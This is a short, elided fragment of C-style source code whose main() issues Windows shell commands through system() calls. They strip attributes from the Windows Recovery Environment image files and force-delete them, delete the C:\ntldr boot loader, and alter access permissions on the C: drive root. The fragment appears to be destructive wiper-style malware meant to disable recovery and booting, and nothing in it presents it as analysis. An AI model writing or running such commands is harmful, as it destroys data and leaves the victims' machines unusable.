...
int main() {
	...
	cls;
	system("del C:\\Recovery\\WindowsRE\\Winre.wim.exe /f /s /q");
	cls;
	system("attrib -r -s -h C:\\Windows\\System32\\Recovery\\Winre.wim.exe");
	cls;
	system("del C:\\Windows\\System32\\Recovery\\Winre.wim.exe /f /s /q");
	cls;
	...
	system("del C:\\ntldr /f /s /q");
	cls;
	system("icacls C:\\ /remove:d Everyone");
	cls;
